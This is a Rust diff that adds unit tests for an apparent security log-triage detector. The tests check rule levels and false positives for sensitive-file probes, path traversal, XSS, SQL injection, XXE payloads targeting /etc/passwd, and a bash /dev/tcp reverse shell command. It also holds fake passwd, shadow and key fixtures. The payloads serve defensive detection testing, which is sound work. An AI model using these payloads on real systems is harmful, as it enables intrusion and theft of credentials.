@@ -31,6 +31,531 @@ fn run(events: &[Event]) -> Triage {
 fn contains(t: &Triage, rule: &str) -> bool {
     t.detections.iter().any(|d| d.rule == rule)
 }
+
+fn application_request(id: usize, seconds: i64, path: &str) -> Event {
+    let mut e = event(id, seconds, json!({}));
+    e.source = "org.springframework.web.servlet.PageNotFound".into();
+    e.message = format!("No mapping found for HTTP request with URI [{path}] in DispatcherServlet with name 'dispatcher'");
+    e.raw = e.message.clone();
+    e
+}
+#[test]
+fn content_application_log_paths_have_deliberate_levels_and_exact_excerpts() {
+    for (path, rule, level) in [
+        ("/geoserver/.bash_history", "sensitive_request", 3),
+        ("/geoserver/mysqldump.sql", "backup_request", 2),
+        ("/geoserver/id_rsa_1024", "sensitive_request", 3),
+        ("/other/.ssh/id_ed25519", "sensitive_request", 3),
+        ("/etc/passwd", "sensitive_request", 3),
+        ("/etc/shadows", "sensitive_request", 3),
+        ("/geoserver/.htpasswds", "sensitive_request", 3),
+        ("/geoserver/.env.production", "ambiguous_request", 1),
+        ("/download?file=../../application/startup.conf", "path_traversal", 3),
+        ("/download?file=..%252f..%252fetc%252fpasswd", "traversal_request", 3),
+    ] {
+        let event = application_request(0, 0, path);
+        let result = run(&[event.clone()]);
+        let d = result.detections.iter().find(|d| d.rule == format!("content.{rule}")).unwrap_or_else(|| panic!("missing {rule} for {path}"));
+        assert_eq!(d.evidence.evidence_level, level, "{path}");
+        assert_eq!(d.evidence.outcome,"failure");
+        assert_eq!(d.evidence.claim,"attempt");
+        assert!(d.evidence.checks.iter().any(|c|c.status=="passed" && !c.event_refs.is_empty()));
+        assert!(d.evidence.checks.iter().any(|c|c.status=="failed" && c.observed=="failure"));
+        let x=&d.evidence.excerpts[0];
+        assert_eq!(x.field,"message");
+        if !path.contains('%') { assert_eq!(&event.message[x.start..x.end],x.matched); assert!(x.before.contains("URI")); }
+    }
+    for path in ["/index.html","/api/credentials","/assets/env.production.js","/images/id_rsa_1024.png","/help/etc/passwd.html","/user/password-reset","../styles/theme.css"] {
+        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"benign near miss: {path}");
+    }
+}
+
+#[test]
+fn content_xxe_parser_denial_and_payload_do_not_assert_disclosure() {
+    let raw="01:53:47,839 ERROR [org.geoserver.ows] (http-/0.0.0.0:443-26) : org.geoserver.platform.ServiceException: org.xml.sax.SAXException: Entity resolution disallowed for file:///etc/passwd\n\tat org.geoserver.wfs.kvp.FilterKvpParser.parseXMLFilterWithOldParser(FilterKvpParser.java:145)";
+    let e=crate::sources::parse_line(raw.as_bytes(),"wildfly",None,&[]);
+    let result=run(&[e]);
+    let d=result.detections.iter().find(|d|d.rule=="content.xxe_blocked").expect("XML parser diagnosis");
+    assert_eq!((d.evidence.evidence_level,d.evidence.claim.as_str(),d.evidence.outcome.as_str()),(4,"attempt","blocked"));
+    assert!(!result.detections.iter().any(|d|d.evidence.claim=="effect"||d.rule.contains("disclosure")));
+    let payload=r#"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><Filter><PropertyIsEqual"#;
+    let mut e=event(0,0,json!({}));e.message=payload.into();
+    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap().evidence.evidence_level,3);
+    e.fields.insert("http.request.body.content".into(),json!(payload));e.message.clear();
+    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_request").unwrap().evidence.evidence_level,4);
+    for benign in [r#"<!DOCTYPE note SYSTEM "https://example.org/note.dtd">"#,r#"<!ENTITY app SYSTEM "file:///app/schema.dtd">"#,"Entity resolution disallowed for https://example.org/schema.dtd"] {
+        e.fields.clear();e.message=benign.into();assert!(run(&[e.clone()]).detections.is_empty(),"{benign}");
+    }
+    e.fields.insert("event.kind".into(),json!("documentation"));e.message=payload.into();
+    assert!(run(&[e]).detections.is_empty());
+}
+
+#[test]
+fn content_request_payloads_are_not_inconclusive_or_sql_errors() {
+    for (path, rule) in [
+        ("/search=<script>alert('XSS')</script>","xss_request"),
+        ("/?q=%3Cimg%20src=x%20onerror=alert(1)%3E","xss_request"),
+        ("/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--","sqli_request"),
+        ("/?id=' OR 1=1--","sqli_request"),
+        ("/?id=1%27+OR+%271%27=%271%27--","sqli_request"),
+        ("/?id='; SELECT pg_sleep(5)--","sqli_request"),
+    ] {
+        let r=run(&[application_request(0,0,path)]);
+        let d=r.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("missing {path}"));
+        assert_eq!(d.evidence.evidence_level,3);
+        assert_eq!(d.evidence.outcome,"failure");
+    }
+    for path in ["/?q=select+product","/?q=You+have+an+error+in+your+SQL+syntax","/js/application.js","/?id=' OR 1=2--"] {
+        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"{path}");
+    }
+    let mut docs=application_request(0,0,"/?q=<script>alert(1)</script>");
+    docs.message=format!("Example: {}",docs.message);
+    assert!(run(&[docs]).detections.is_empty());
+}
+
+#[test]
+fn content_probe_correlation_counts_families_and_scopes_not_retries() {
+    let paths=["/app/.env.old","/app/id_rsa_3072","/app/mysqldump.sql"];
+    let events:Vec<_>=paths.iter().enumerate().map(|(id,path)|application_request(id,id as i64,path)).collect();
+    let result=run(&events);
+    let d=result.detections.iter().find(|d|d.rule=="content.sensitive_probe_set").expect("three distinct families");
+    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.distinct,3);assert_eq!(d.event_ids,vec![0,1,2]);
+    assert_eq!(result.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
+    for field in ["source.ip","host.name","service.name","cloud.account.id","caminho"] {
+        let changed:Vec<_>=events.iter().enumerate().map(|(i,e)|{let mut e=e.clone();e.fields.insert(field.into(),json!(format!("different-{i}")));e}).collect();
+        assert!(!contains(&run(&changed),"content.sensitive_probe_set"),"{field}");
+    }
+    let mut outside=events.clone();outside[2].timestamp=outside[0].timestamp.map(|t|t+600001);
+    assert!(!contains(&run(&outside),"content.sensitive_probe_set"));
+    let retry:Vec<_>=["/.env.old","/.env.production","/.env.local","/.env.bak"].iter().enumerate().map(|(i,p)|application_request(i,i as i64,p)).collect();
+    assert!(!contains(&run(&retry),"content.sensitive_probe_set"));
+    let no_time:Vec<_>=events.iter().cloned().map(|mut e|{e.timestamp=None;e}).collect();
+    assert!(!contains(&run(&no_time),"content.sensitive_probe_set"));
+}
+
+#[test]
+fn content_xxe_target_boundaries_and_config_ambiguity() {
+    for payload in [r#"<!ENTITY x SYSTEM "file:///etc/passwd.html">"#,r#"<!ENTITY x SYSTEM "http://localhost.example.org/schema">"#,
+        "Entity resolution disallowed for file:///etc/passwd.html",r#"<!ENTITY x SYSTEM "php://filter/resource=/app/schema.dtd">"#] {
+        let mut e=event(0,0,json!({}));e.message=payload.into();
+        assert!(run(&[e]).detections.is_empty(),"{payload}");
+    }
+    let r=run(&[application_request(0,0,"/app/config/config.dev.yml")]);
+    assert_eq!(r.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
+}
+
+#[test]
+fn content_any_original_field_nested_array_and_raw_keep_provenance() {
+    let payload=r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#;
+    for (fields, message, raw, expected) in [
+        (json!({"vendorBlob":payload}),"","","vendorBlob"),
+        (json!({"opaque":{"chunks":[{"value":payload}]}}),"","","opaque.chunks.0.value"),
+        (json!({}),"",payload,"raw"),
+        (json!({}),payload,"","message"),
+    ] {
+        let mut e=event(0,0,fields);e.message=message.into();e.raw=raw.into();
+        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap();
+        assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.claim,"activity");
+        assert_eq!(d.evidence.excerpts[0].field,expected);
+    }
+    let line="No mapping found for HTTP request with URI [/other/id_rsa_4096] in dispatcher";
+    let e=event(0,0,json!({"original":{"unexpected":line}}));
+    let r=run(&[e]);let d=r.detections.iter().find(|d|d.rule=="content.sensitive_request").unwrap();
+    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.excerpts[0].field,"original.unexpected");
+    assert_eq!(&line[d.evidence.excerpts[0].start..d.evidence.excerpts[0].end],d.evidence.excerpts[0].matched);
+    for (text,rule,level) in [("<script>alert('XSS')</script>","xss_payload",2),
+        ("%3Cscript%3Ealert(1)%3C/script%3E","xss_payload",2),("' OR 1=1--","sqli_payload",2),
+        ("../../etc/passwd","traversal_payload",3),("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","reverse_payload",4)] {
+        let e=event(0,0,json!({"opaque":{"items":[text]}}));
+        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("{rule}"));
+        assert_eq!(d.evidence.evidence_level,level);assert_eq!(d.evidence.excerpts[0].field,"opaque.items.0");
+    }
+}
+
+#[test]
+fn content_generic_scan_keeps_boundaries_and_does_not_use_enrichment() {
+    for fields in [json!({"a":"<!ENTITY xxe SYSTEM ","b":"file:///etc/passwd"}),
+        json!({"a":"<script>","b":"alert(1)</script>"}),
+        json!({"a":"' OR 1=", "b":"1--"}),
+        json!({"query":"SELECT a FROM users UNION SELECT a FROM archived_users"}),
+        json!({"opaque":"Documentation: <script>alert(1)</script>"}),
+        json!({"_sec.content.xxe_request":"true"})] {
+        assert!(run(&[event(0,0,fields.clone())]).detections.is_empty(),"{fields}");
+    }
+    let mut e=event(0,0,json!({}));e.name="<script>alert(1)</script>".into();e.description="' OR 1=1--".into();
+    assert!(run(&[e]).detections.is_empty());
+    let e=event(0,0,json!({"opaque":{"first":"<script>alert(1)</script>","copy":"<script>alert(1)</script>"}}));
+    let r=run(&[e]);let ds:Vec<_>=r.detections.iter().filter(|d|d.rule=="content.xss_payload").collect();
+    assert_eq!(ds.len(),1);assert_eq!(ds[0].evidence.evidence_level,2);assert_eq!(ds[0].evidence.excerpts.len(),1);
+    let fields:serde_json::Map<_,_>=(0..140).map(|i|(format!("field-{i:03}"),json!("value"))).collect();
+    let (_,normalized)=crate::security_normalize::normalize(&event(0,0,Value::Object(fields)),&[]);
+    assert!(normalized.content_clipped);assert!(!normalized.limitations.is_empty());
+}
+
+#[test]
+fn content_catalog_parity_does_not_promote_normal_sql_or_returned_scripts() {
+    let rules=detections::builtin_ruleset().unwrap();let catalog=crate::threats::builtin_catalog();let settings=Settings::default();
+    let input=detections::Inputs {rules:&rules,catalog:Some(&catalog),settings:&settings};
+    for fields in [json!({"sql":"SELECT name FROM users UNION SELECT name FROM old_users"}),
+        json!({"http.response.body.content":"<script>alert(1)</script>"}),
+        json!({"opaque":"echo '<script>alert(1)</script>'"}),
+        json!({"opaque":"Documentation: <script>alert(1)</script>"}),
+        json!({"opaque":"echo '<script>alert(1)</script>'","event.kind":"documentation"}),
+        json!({"response":{"body":"No mapping found for HTTP request with URI [/etc/passwd] in dispatcher"}})] {
+        let e=event(0,0,fields.clone());let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
+        assert!(r.detections.is_empty(),"legitimate/context-only: {fields}: {:?}",r.detections.iter().map(|d|&d.rule).collect::<Vec<_>>());
+    }
+    let e=application_request(0,0,"/?q=<script>alert(1)</script>");
+    let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
+    assert!(r.detections.iter().any(|d|d.rule=="content.xss_request"&&d.evidence.evidence_level==3));
+    assert!(!r.detections.iter().any(|d|d.signal_rules.iter().any(|r|r.starts_with("web.xss."))));
+}
+fn web_content(id: usize, path: &str, body: &str) -> Event {
+    event(
+        id,
+        id as i64,
+        json!({"event.category":"web","event.action":"http_request","host.name":"web-a","url.original":path,"http.response.body.content":body,"http.response.status_code":200}),
+    )
+}
+const PASSWD_CONTENT: &str =
+    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";
+
+#[test]
+fn content_request_and_response_are_distinct_and_highlight_original_fields() {
+    let e = web_content(0, "/download?file=../../etc/passwd", PASSWD_CONTENT);
+    let result = run(&[e]);
+    for (rule, level) in [
+        ("sensitive_request", 3),
+        ("traversal_request", 3),
+        ("passwd_response", 4),
+        ("passwd_disclosure", 5),
+    ] {
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == format!("content.{rule}"))
+            .unwrap_or_else(|| panic!("missing {rule}"));
+        assert_eq!(d.evidence.evidence_level, level, "{rule}");
+        assert!(!d.evidence.excerpts.is_empty());
+        assert!(d
+            .evidence
+            .excerpts
+            .iter()
+            .all(|x| x.event_ref == d.evidence.event_refs[0]));
+    }
+    let d = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.passwd_disclosure")
+        .unwrap();
+    assert!(d
+        .evidence
+        .excerpts
+        .iter()
+        .any(|x| x.field == "http.response.body.content" && x.matched.starts_with("root:x:0:0:")));
+    assert!(d
+        .evidence
+        .excerpts
+        .iter()
+        .any(|x| x.field == "url.original"));
+    let attempt = run(&[web_content(0, "/?file=..%252f..%252fetc%252fpasswd", "")]);
+    assert!(contains(&attempt, "content.traversal_request"));
+    assert!(!contains(&attempt, "content.passwd_disclosure"));
+    assert!(attempt
+        .detections
+        .iter()
+        .filter(|d| d.rule.starts_with("content."))
+        .flat_map(|d| &d.evidence.excerpts)
+        .any(|x| x.transformation.contains("percent")));
+}
+
+#[test]
+fn content_excludes_denials_reflection_documentation_and_cross_event_bodies() {
+    let base = web_content(0, "/../../etc/passwd", PASSWD_CONTENT);
+    for (key, value) in [
+        ("event.outcome", json!("blocked")),
+        ("http.response.status_code", json!(403)),
+        ("event.kind", json!("documentation")),
+        ("http.request.body.content", json!(PASSWD_CONTENT)),
+    ] {
+        let mut e = base.clone();
+        e.fields.insert(key.into(), value);
+        let r = run(&[e]);
+        assert!(!contains(&r, "content.passwd_response"), "{key}");
+        assert!(!contains(&r, "content.passwd_disclosure"));
+    }
+    for body in ["File not found: /etc/passwd","root:x:0:0:root:/root:/bin/bash", "<pre>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</pre>"] {
+        assert!(!contains(&run(&[web_content(0,"/etc/passwd",body)]),"content.passwd_response"));
+    }
+    let mut quoted = event(
+        0,
+        0,
+        json!({"description":PASSWD_CONTENT,"comment":"cat /etc/shadow"}),
+    );
+    quoted.message = PASSWD_CONTENT.into();
+    assert!(run(&[quoted])
+        .detections
+        .iter()
+        .all(|d| !d.rule.starts_with("content.")));
+    let r = run(&[
+        web_content(0, "/etc/passwd", ""),
+        web_content(1, "/normal", PASSWD_CONTENT),
+    ]);
+    assert!(
+        !contains(&r, "content.passwd_disclosure"),
+        "Different events are not linked by proximity or host"
+    );
+}
+
+#[test]
+fn content_read_commands_require_sensitive_target_and_keep_admin_ambiguity() {
+    assert!(!contains(
+        &run(&[process(0, 0, "cat /var/log/application.log")]),
+        "content.sensitive_read"
+    ));
+    assert!(!contains(
+        &run(&[process(0, 0, "echo 'cat /etc/shadow'")]),
+        "content.sensitive_read"
+    ));
+    let e = process(0, 0, "cat /etc/passwd");
+    let r = run(&[e.clone()]);
+    let d = r
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.sensitive_read")
+        .unwrap();
+    assert_eq!(d.evidence.evidence_level, 1);
+    let mut e = e;
+    e.fields
+        .insert("process.parent.name".into(), json!("nginx"));
+    assert!(contains(&run(&[e]), "content.web_process_read"));
+    assert!(contains(
+        &run(&[web_content(0, "/api?cmd=cat%20%2fetc%2fshadow", "")]),
+        "content.read_request"
+    ));
+}
+
+#[test]
+fn content_shadow_private_keys_and_configuration_need_coherent_structures() {
+    let shadow = format!("root:$6$testsalt${}:20000:0:99999:7:::", "a".repeat(86));
+    assert!(contains(
+        &run(&[web_content(0, "/etc/shadow", &shadow)]),
+        "content.shadow_disclosure"
+    ));
+    for body in [
+        "root:!:20000:0:99999:7:::",
+        "root:$6$short:20000:0:99999:7:::",
+    ] {
+        assert!(!contains(
+            &run(&[web_content(0, "/etc/shadow", body)]),
+            "content.shadow_response"
+        ));
+    }
+    let pem="-----BEGIN RSA PRIVATE KEY-----\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd\n-----END RSA PRIVATE KEY-----";
+    assert!(contains(
+        &run(&[web_content(0, "/.ssh/id_rsa", pem)]),
+        "content.private_key_disclosure"
+    ));
+    assert!(!contains(
+        &run(&[web_content(
+            0,
+            "/.ssh/id_rsa",
+            &pem.replace("END RSA", "END EC")
+        )]),
+        "content.private_key_response"
+    ));
+    let config = "DB_HOST=database.internal\nDB_PASSWORD=fixture-value-123456";
+    assert!(contains(
+        &run(&[web_content(0, "/.env", config)]),
+        "content.secrets_disclosure"
+    ));
+    assert!(!contains(
+        &run(&[web_content(
+            0,
+            "/.env",
+            "DB_HOST=database.internal\nDB_PASSWORD=changeme"
+        )]),
+        "content.secrets_response"
+    ));
+    assert!(!contains(
+        &run(&[web_content(0, "/.env", "DB_PASSWORD=fixture-value-123456")]),
+        "content.secrets_response"
+    ));
+}
+
+#[test]
+fn content_excerpts_are_utf8_bounded_and_reverse_shell_has_real_command() {
+    let text = format!("{}cat /etc/shadow{}", "é".repeat(1000), "🦀".repeat(1000));
+    let x = crate::evidence::Excerpt::new("r", "f", "original", &text, 2000, 2015).unwrap();
+    assert_eq!(
+        x.matched,
+        "cat /etc/shadow🦀".get(..15).unwrap_or("cat /etc/shadow")
+    );
+    assert!(x.prefix_omitted && x.suffix_omitted);
+    let r = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1")]);
+    let d = r
+        .detections
+        .iter()
+        .find(|d| d.rule == "attempt.reverse-shell.process")
+        .unwrap();
+    assert!(d
+        .evidence
+        .excerpts
+        .iter()
+        .any(|x| x.matched.contains("/dev/tcp/192.0.2.10/4444")));
+    assert!(d
+        .evidence
+        .excerpts
+        .iter()
+        .all(|x| !x.field.starts_with("_sec.")));
+}
+
+#[test]
+fn content_separate_responses_require_exact_scoped_request_and_chronology() {
+    let mut a = web_content(0, "/../../etc/passwd", "");
+    let mut b = web_content(1, "/normal", PASSWD_CONTENT);
+    for e in [&mut a, &mut b] {
+        e.fields.insert("http.request.id".into(), json!("r-1"));
+        e.fields.insert("service.name".into(), json!("files"));
+        e.fields.insert(
+            "@timestamp".into(),
+            json!(
+                chrono::DateTime::from_timestamp_millis(e.timestamp.unwrap())
+                    .unwrap()
+                    .to_rfc3339()
+            ),
+        );
+    }
+    let r = run(&[a.clone(), b.clone()]);
+    let d = r
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.passwd_linked_response")
+        .unwrap();
+    assert_eq!(d.evidence.evidence_level, 5);
+    assert_eq!(d.evidence.event_refs.len(), 2);
+    for (key, v) in [
+        ("http.request.id", "r-2"),
+        ("host.name", "web-b"),
+        ("service.name", "other"),
+        ("cloud.account.id", "another-tenant"),
+    ] {
+        let mut different = b.clone();
+        different.fields.insert(key.into(), json!(v));
+        assert!(
+            !contains(
+                &run(&[a.clone(), different]),
+                "content.passwd_linked_response"
+            ),
+            "{key}"
+        );
+    }
+    let mut missing = b.clone();
+    missing.fields.remove("http.request.id");
+    assert!(!contains(
+        &run(&[a.clone(), missing]),
+        "content.passwd_linked_response"
+    ));
+    let mut late = b.clone();
+    late.timestamp = a.timestamp.map(|t| t + 300_001);
+    late.fields.insert(
+        "@timestamp".into(),
+        json!(
+            chrono::DateTime::from_timestamp_millis(late.timestamp.unwrap())
+                .unwrap()
+                .to_rfc3339()
+        ),
+    );
+    assert!(!contains(
+        &run(&[a.clone(), late]),
+        "content.passwd_linked_response"
+    ));
+    let mut same = b.clone();
+    same.timestamp = a.timestamp;
+    same.fields
+        .insert("@timestamp".into(), a.fields["@timestamp"].clone());
+    assert!(run(&[a.clone(), same])
+        .detections
+        .iter()
+        .filter(|d| d.rule == "content.passwd_linked_response")
+        .all(|d| d.evidence.evidence_level <= 3));
+    a.fields.insert("event.outcome".into(), json!("blocked"));
+    assert!(!contains(&run(&[a, b]), "content.passwd_linked_response"));
+}
+
+#[test]
+fn content_original_event_lookup_checks_analysis_and_membership() {
+    let state = crate::AppState {
+        source: parking_lot::RwLock::new(crate::SourceData::None),
+        source_names: parking_lot::RwLock::new(vec![]),
+        codes: parking_lot::RwLock::new(Default::default()),
+        system_codes: parking_lot::RwLock::new(Default::default()),
+        derived: parking_lot::RwLock::new(vec![]),
+        case_store_lock: parking_lot::Mutex::new(()),
+        codes_path: Default::default(),
+        system_codes_path: Default::default(),
+    };
+    let original = web_content(0, "/etc/passwd", PASSWD_CONTENT);
+    let events = vec![original.clone()];
+    let full = crate::triage::stored_analysis(&state, Some(&events), false).unwrap();
+    let id = full.metadata["analysis_id"].as_str().unwrap();
+    let reference = crate::security_normalize::event_ref(&original);
+    let fetched =
+        crate::triage::evidence_event_impl(&state, id, &reference, 0, Some(&events)).unwrap();
+    assert_eq!(fetched.fields, original.fields);
+    assert!(
+        crate::triage::evidence_event_impl(&state, "stale", &reference, 0, Some(&events)).is_err()
+    );
+    assert!(
+        crate::triage::evidence_event_impl(&state, id, "another-event", 0, Some(&events)).is_err()
+    );
+    assert!(crate::triage::evidence_event_impl(&state, id, &reference, 99, Some(&events)).is_err());
+}
+
+#[test]
+fn content_custom_source_mapping_and_size_limits_are_explicit() {
+    let e = event(
+        0,
+        0,
+        json!({"operation":"web-access","target_uri":"/etc/passwd","returned":PASSWD_CONTENT}),
+    );
+    let mapping = crate::security_normalize::SourceMapping {
+        source: e.source.clone(),
+        fields: std::collections::BTreeMap::from([
+            ("action".into(), "operation".into()),
+            ("url".into(), "target_uri".into()),
+            ("response_body".into(), "returned".into()),
+        ]),
+        actions: std::collections::BTreeMap::from([("web-access".into(), "http_request".into())]),
+        ..Default::default()
+    };
+    crate::security_normalize::validate_mappings(&[mapping.clone()]).unwrap();
+    let (view, n) = crate::security_normalize::normalize(&e, &[mapping]);
+    assert_eq!(view.fields["_sec.content.passwd_disclosure"], "true");
+    assert!(n.signals.iter().any(|s| s.excerpt.field == "returned"));
+    let long = web_content(
+        0,
+        "/etc/passwd",
+        &format!("{PASSWD_CONTENT}\n{}", " ".repeat(100_000)),
+    );
+    let result = run(&[long]);
+    assert!(result.limited);
+    assert!(result
+        .limitations
+        .iter()
+        .any(|s| s.contains("textual parcial")));
+    let d = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.passwd_disclosure")
+        .unwrap();
+    assert!(d.evidence.evidence_level <= 3);
+    assert!(d
+        .evidence
+        .missing_evidence
+        .iter()
+        .any(|s| s.contains("64 KiB")));
+}
 fn custom(rule: Value, events: &[Event], settings: &Settings) -> Triage {
     let rules = detections::test_ruleset(vec![serde_json::from_value(rule).unwrap()], vec![]).unwrap();
     detections::run(
@@ -185,6 +710,145 @@ fn security_disk_pages_preserve_levels_members_and_universe() {
 }
 
 #[test]
+fn security_pattern_groups_preserve_all_occurrences_before_paging() {
+    let events: Vec<_> = (0..205).map(|id| {
+        let mut e = event(id, id as i64, json!({"source.ip":"192.0.2.8","service.name":"geo","arbitrary":{"text":format!(
+            "thread-{id}: org.xml.sax.SAXException: Entity resolution disallowed for file:///etc/passwd at line {id}"
+        )}}));
+        e.event_ref = format!("{}:{id}", "a".repeat(64));
+        e
+    }).collect();
+    let rules = detections::builtin_ruleset().unwrap();
+    let settings = Settings { threats: false, ..Default::default() };
+    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
+    let memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
+    assert_eq!(memory.detections.len(), 205);
+    assert_eq!(memory.episodes.len(), 1, "log wrappers must not create repeated cards");
+    let group = &memory.episodes[0];
+    assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 205);
+    assert_eq!(group.evidence_level, 4);
+    assert_eq!(group.event_refs.len(), 205);
+    assert_eq!((group.start, group.end), (events[0].timestamp, events[204].timestamp));
+    assert!(memory.detections.iter().all(|d| d.count == 1 && d.evidence.relationships.is_empty()
+        && d.evidence.evidence_level == 4 && d.evidence.outcome == "blocked"));
+    let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
+    let page = disk.page(4, 0, 1, None, None).unwrap();
+    assert_eq!(page["page"]["total_episodes"], 1);
+    assert!(page["page"]["next_offset"].is_null());
+    assert_eq!(page["episodes"][0]["id"], group.id);
+    assert_eq!(page["episodes"][0]["participants"], json!(group.participants));
+    assert!(group.participants.facts.iter().any(|f| f.value=="192.0.2.8" && f.origins_limited));
+    assert_eq!(page["episodes"][0]["grouping"]["occurrence_count"], 205);
+    assert_eq!(page["episodes"][0]["members_complete"], false);
+    assert_eq!(page["counts_by_level"], json!(memory.counts_by_level));
+    assert_eq!(page["visible_detections"], 205);
+    assert_eq!(disk.page(5, 0, 1, None, None).unwrap()["page"]["total_episodes"], 0);
+    assert_eq!(disk.page(1, 0, 1, None, None).unwrap()["episodes"][0]["id"], group.id);
+    let mut ids = std::iter::once(204);
+    let filtered = disk.page(4, 0, 1, Some(&mut ids), None).unwrap();
+    assert_eq!(filtered["visible_detections"], 1);
+    assert_eq!(filtered["episodes"][0]["id"], group.id);
+    assert_eq!(filtered["episodes"][0]["record_count"], 205);
+    assert_eq!(filtered["detections"][0]["event_ids"], json!([204]));
+    assert_eq!(filtered["detections"][0]["context_only"], false);
+    let mut all = std::collections::BTreeSet::new();
+    let mut offset = 0;
+    loop {
+        let members = disk.episode_members(&group.id, offset, 20).unwrap();
+        for d in members["detections"].as_array().unwrap() {
+            let original = memory.detections.iter().find(|m| m.id == d["id"]).unwrap();
+            assert_eq!(d["event_refs"], json!(original.evidence.event_refs));
+            assert_eq!(d["excerpts"], json!(original.evidence.excerpts));
+            assert_eq!(d["relationships"], json!([]));
+            assert_eq!(d["evidence_level"], 4);
+            assert!(all.insert(d["id"].as_str().unwrap().to_string()));
+            let original_episode = disk.episode_members(d["source_episode_id"].as_str().unwrap(), 0, 1).unwrap();
+            assert_eq!(original_episode["total"], 1, "original episode remains addressable");
+            assert_eq!(original_episode["detections"][0]["id"], d["id"]);
+        }
+        match members["next_offset"].as_u64() { Some(n) => offset = n as usize, None => break }
+    }
+    assert_eq!(all.len(), 205);
+    let reversed: Vec<_> = events.iter().rev().cloned().collect();
+    assert_eq!(run(&reversed).episodes[0].id, group.id);
+}
+
+#[test]
+fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
+    let e = event(0, 0, json!({"message":"Entity resolution disallowed for file:///etc/passwd","host.name":"server-a"}));
+    let result = run(&[e]);
+    let original = result.detections.iter().find(|d| d.rule == "content.xxe_blocked").unwrap();
+    let key = crate::security_grouping::pattern(original).expect("complete single-event pattern");
+    let mut changed = original.clone();
+    changed.start = None; changed.end = None;
+    changed.evidence.excerpts[0].before = "another timestamp and worker".into();
+    changed.evidence.excerpts[0].after = "a different stack trace".into();
+    assert_eq!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key));
+    let mut signal = original.clone(); signal.kind = "signal".into(); signal.signal_rules = vec!["signal-a".into()];
+    let signal_key = crate::security_grouping::pattern(&signal).expect("standalone text signal");
+    signal.signal_rules.push("signal-b".into());
+    assert_ne!(crate::security_grouping::pattern(&signal).as_ref(), Some(&signal_key));
+    for variant in 0..10 {
+        let mut changed = original.clone();
+        match variant {
+            0 => changed.evidence.evidence_level = 3,
+            1 => changed.evidence.outcome = "success".into(),
+            2 => changed.evidence.claim = "effect".into(),
+            3 => changed.namespace = "another-tenant".into(),
+            4 => changed.evidence.excerpts[0].matched = "Entity resolution disallowed for file:///etc/shadow".into(),
+            5 => changed.evidence.excerpts[0].field = "response.body".into(),
+            6 => changed.pattern_source = Some("another-file".into()),
+            7 => changed.evidence.evidence_members[0].provenance.get_mut("host").unwrap().value = "server-b".into(),
+            8 => changed.evidence.rule_version = "another-version".into(),
+            _ => changed.entities.push(detections::EntityRef { column:"@src_ip".into(),label:"IP".into(),value:"192.0.2.9".into() }),
+        }
+        assert_ne!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key), "variant {variant}");
+    }
+    let mut different_identity=original.clone();
+    different_identity.participants=crate::security_participants::extract(
+        &event(0,0,json!({"source.user.name":"another-identity"})),&Default::default(),"content.xxe_blocked",&[]);
+    assert_ne!(crate::security_grouping::pattern(&different_identity).as_ref(),Some(&key));
+    for variant in 0..6 {
+        let mut changed = original.clone();
+        match variant {
+            0 => changed.kind = "sequence".into(),
+            1 => changed.evidence.event_refs.push("other-original".into()),
+            2 => changed.evidence.excerpts[0].match_truncated = true,
+            3 => changed.evidence.evidence_level = 0,
+            4 => changed.participants.limited = true,
+            _ => changed.evidence.relationships.push(crate::evidence::Relationship {kind:"reconstruction".into(),fields:vec![],description:"fragments".into()}),
+        }
+        assert!(crate::security_grouping::pattern(&changed).is_none());
+    }
+}
+
+#[test]
+fn security_pattern_groups_keep_individual_levels_with_multiple_rules_per_event() {
+    let events: Vec<_> = (0..3).map(|id| web_content(id,"/download?file=../../etc/passwd",PASSWD_CONTENT)).collect();
+    let memory = run(&events);
+    assert_eq!(memory.episodes.len(), 1);
+    let group = &memory.episodes[0];
+    assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 3);
+    assert_eq!(group.event_refs.len(), 3);
+    assert_eq!(group.evidence_level, 5);
+    let levels: std::collections::BTreeSet<_> = memory.detections.iter().map(|d|d.evidence.evidence_level).collect();
+    assert_eq!(levels, [3,4,5].into_iter().collect(), "context findings keep their own levels");
+    let rules = detections::builtin_ruleset().unwrap();
+    let settings = Settings { threats:false, ..Default::default() };
